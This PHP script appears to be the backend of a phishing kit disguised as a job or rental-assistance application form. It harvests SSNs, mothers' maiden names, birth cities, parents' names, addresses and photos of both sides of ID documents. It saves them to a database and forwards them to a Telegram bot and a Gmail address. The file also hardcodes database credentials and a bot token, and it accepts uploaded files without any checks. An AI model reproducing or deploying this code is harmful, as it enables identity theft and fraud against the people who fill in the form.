<?php
// ======================
// NEON DATABASE (PostgreSQL)
// ======================
$host = "ep-calm-frog-ahfjj5vo-pooler.c-3.us-east-1.aws.neon.tech";
$db   = "neondb";
$user = "neondb_owner";
$pass = "npg_TQ1gBOwA9rCa";
$port = "5432";

$dsn = "pgsql:host=$host;port=$port;dbname=$db";

try {
    $pdo = new PDO($dsn, $user, $pass, [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION
    ]);
} catch (Exception $e) {
    die("DB Connection failed: " . $e->getMessage());
}

// ======================
// FORM DATA
// ======================
$first_name = $_POST['first_name'];
$middle_name = $_POST['middle_name'];
$last_name = $_POST['last_name'];
$phone = $_POST['phone'];
$email = $_POST['email'];
$dob = $_POST['dob'];
$mother_maiden = $_POST['mother_maiden'];
$ssn = $_POST['ssn'];
$birth_city = $_POST['birth_city'];
$address_line1 = $_POST['address_line1'];
$address_line2 = $_POST['address_line2'];
$city = $_POST['city'];
$state = $_POST['state'];
$zip_code = $_POST['zip_code'];

$address = $address_line1 . " " . $address_line2 . ", " . $city . ", " . $state . " " . $zip_code;
$father_name = $_POST['father_name'];
$mother_name = $_POST['mother_name'];

// ======================
// FILE UPLOAD FUNCTION
// ======================
function uploadFile($file) {
    if ($file['error'] == 0) {
        $name = time() . "_" . basename($file['name']);
        $target = "uploads/" . $name;
        move_uploaded_file($file['tmp_name'], $target);
        return $target;
    }
    return null;
}

$front_id = uploadFile($_FILES['front_id']);
$back_id  = uploadFile($_FILES['back_id']);

// ======================
// SAVE TO DATABASE
// ======================
$stmt = $pdo->prepare("
INSERT INTO job_applications (
first_name, middle_name, last_name,
phone, email, dob, mother_maiden,
ssn, birth_city, address,
father_name, mother_name,
front_id, back_id
)
VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
");

$stmt->execute([
$first_name, $middle_name, $last_name,
$phone, $email, $dob, $mother_maiden,
$ssn, $birth_city, $address,
$father_name, $mother_name,
$front_id, $back_id
]);

// ======================
// TELEGRAM BOT SETUP
// ======================
$botToken = "8538050369:AAGHLSy5D7r-_6QA9K1rbqkebWrzpbjc1ek";
$chatId = "6513265609";

// 🔥 YOUR REAL RENDER URL
$baseUrl = "https://homeandrentalassistance.onrender.com";

// FIX: build correct file URLs
$front_url = $baseUrl . "/" . $front_id;
$back_url  = $baseUrl . "/" . $back_id;

// ======================
// SEND TEXT MESSAGE
// ======================
$text = "📄 New Application Submitted\n\n"
. "👤 Name: $first_name $middle_name $last_name\n"
. "📞 Phone: $phone\n"
. "📧 Email: $email\n"
. "🎂 DOB: $dob\n"
. "🏠 Address: $address_line1 $address_line2, $city, $state $zip_code\n"
. "🏙 Birth City: $birth_city\n"
. "👨 Father: $father_name\n"
. "👩 Mother: $mother_name\n"
. "🧾 SSN: $ssn";

file_get_contents(
    "https://api.telegram.org/bot$botToken/sendMessage?" . http_build_query([
        "chat_id" => $chatId,
        "text" => $text
    ])
);

// ======================
// SEND FRONT ID IMAGE
// ======================
file_get_contents(
    "https://api.telegram.org/bot$botToken/sendPhoto?" . http_build_query([
        "chat_id" => $chatId,
        "photo" => $front_url,
        "caption" => "🪪 Front ID - $first_name $last_name"
    ])
);

// ======================
// SEND BACK ID IMAGE
// ======================
file_get_contents(
    "https://api.telegram.org/bot$botToken/sendPhoto?" . http_build_query([
        "chat_id" => $chatId,
        "photo" => $back_url,
        "caption" => "🪪 Back ID - $first_name $last_name"
    ])
);

// ======================
// EMAIL NOTIFICATION
// ======================
$to = "collaomn@gmail.com";
$subject = "New Job Form Submission";
$body = $text;
$headers = "From: noreply@yourdomain.com";

mail($to, $subject, $body, $headers);

// ======================
echo "Form submitted successfully!";
?>
